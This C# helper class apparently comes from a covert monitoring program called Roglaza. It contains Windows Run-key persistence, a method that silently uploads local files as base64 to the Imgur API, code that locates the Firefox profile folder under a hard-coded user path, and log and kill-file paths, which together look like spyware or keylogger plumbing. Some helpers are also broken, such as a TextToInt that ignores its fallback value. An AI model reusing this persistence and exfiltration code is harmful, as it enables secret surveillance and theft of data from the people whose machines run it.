using Microsoft.Win32;
using Roglaza.Classes;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;

namespace Roglaza
{
    class RoglazaHelper
    {
        internal static string ReadTextFile(string path)
        {
            try
            {
                return System.IO.File.ReadAllText(path);
            }
            catch {
                return GeneralErros.Not_found.ToString();
            }
        }
        public static string ReverseText(string source)
        { 
            if (source == "")
                return source;
            string reversed = "";
            foreach (char c in source)
            {
                reversed = c + reversed;
            }
            return reversed;
        }
        private static void Startup(bool statue)
        {
            try
            {
                RegistryKey rk = Registry.CurrentUser.OpenSubKey
                    ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                string AppName = "Roglaza.exe";
                string appPath = Program.GetExecutablePath();   
               if(statue)
                rk.SetValue(AppName, appPath);
               else
                   rk.DeleteValue(AppName);
            }
            catch
            {                           
            }
        }
        internal static bool FileWriteText(string file, string data)
        {
            try
            {
                System.IO.File.WriteAllText(file, data);
                return true;
            }
            catch { return false; }
        }
        internal static int TextToInt(string value, int Return_value_on_fail)
        {
            bool suc = int.TryParse(value, out Return_value_on_fail);
            return Return_value_on_fail;

        }
        public static bool IsExistedDirectory(string Dirpath)
        {
            return System.IO.Directory.Exists(Dirpath);
        }
        internal static bool createDirectory(string Dirpath)
        {
            try
            {
                System.IO.Directory.CreateDirectory(Dirpath); return true;
            }
            catch { return false; }
        }
        internal static string Upload(string Path_, string key)
        {
            try
            {
                byte[] imageData;
                if (key == "")
                    key = AppInfo.ImgurKey;
                FileStream fileStream = File.OpenRead(Path_);
                imageData = new byte[fileStream.Length];
                fileStream.Read(imageData, 0, imageData.Length);
                fileStream.Close();

                string uploadRequestString = "image=" +/* Uri.EscapeDataString*/(System.Convert.ToBase64String(imageData)) + "&key=" + key;

                HttpWebRequest webRequest = (HttpWebRequest)WebRequest.Create("http://api.imgur.com/2/upload");
                webRequest.Method = "POST";
                webRequest.ContentType = "application/x-www-form-urlencoded";
                webRequest.ServicePoint.Expect100Continue = false;

                StreamWriter streamWriter = new StreamWriter(webRequest.GetRequestStream());
                streamWriter.Write(uploadRequestString);
                streamWriter.Close();

                WebResponse response = webRequest.GetResponse();
                Stream responseStream = response.GetResponseStream();
                StreamReader responseReader = new StreamReader(responseStream);

                string responseString = responseReader.ReadToEnd();
                return "";
            }
            catch { return ""; }
        }
        internal static string RemoveInvalidPathChars(string p)
        {
            p= p.Replace("<","-");
            p = p.Replace(">", "-");
            p = p.Replace("|", "-");
            p = p.Replace("\\", "-");
            p = p.Replace("/", "-");
            p = p.Replace("*", "-");
            p = p.Replace("?", "-");
            p = p.Replace(":", "-");
            return p;

        }
        internal static string createDirectoryIfNotFound(string p)
        {
            char sep = '/';
            if (p.Contains('\\'))
                sep = '\\';

            string[] pieces = p.Split(sep);
            //C://v1/v2/v3
            string dir = pieces[0];
            for(int i=1;i<pieces.Length;i++)
            {
                dir += "\\" + RemoveInvalidPathChars(pieces[i]);
                RoglazaHelper.createDirectory(dir);
            }
            return dir;
        }
        internal static void StartProcess(string p)
        {
            try
            {
                System.Diagnostics.Process.Start(p+"//Logs");
            }
            catch { }
        }
        public static string GetApplicationDataDirectory()
        {
          
            return   Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        }
        public static string GETFireFox_Profile_FOlder()
        {
            string s = @"C:\Users\Exception\AppData\Roaming\Mozilla\Firefox\Profiles\";
            string [] dirs = System.IO.Directory.GetDirectories(s);
            if (dirs.Length < 1)
                return "";
            string res = dirs[0];
            foreach (string d in dirs)
            {
                if(d.EndsWith("default"))
                    res=d;
            }
            return res;
        }

        internal static bool ReverseToBoolean(string value)
        {
            if (value.Length == 0)
                return false;
            value=value.Trim().ToLower();
            return (value == "1" || value == "yes" || value == "true" || value == "ok");
        }

        internal static bool IsExistedFile(string p)
        {
            return System.IO.File.Exists(p);
        }

        internal static string GetTempPath()
        {
            return System.IO.Path.GetTempPath();
        }

        internal static string GetRoglazaAPPDataPath()
        {
            string tempPath = RoglazaHelper.GetTempPath();
            return  tempPath + "//..//Roglaza";
        }

        internal static bool createEmptyFile(string p )
        {
            try
            {
                System.IO.File.Create(p);
                return true;
            }
            catch { return false; }
        }

        internal static bool DeleteFile(string file)
        {
            try
            {
                System.IO.File.Delete(file);
                return false;
            }
            catch
            {
                return false;
            }
        }

        internal static string getKillFilePath()
        {
            return GetRoglazaAPPDataPath() + "//kill";
        }
    }
}
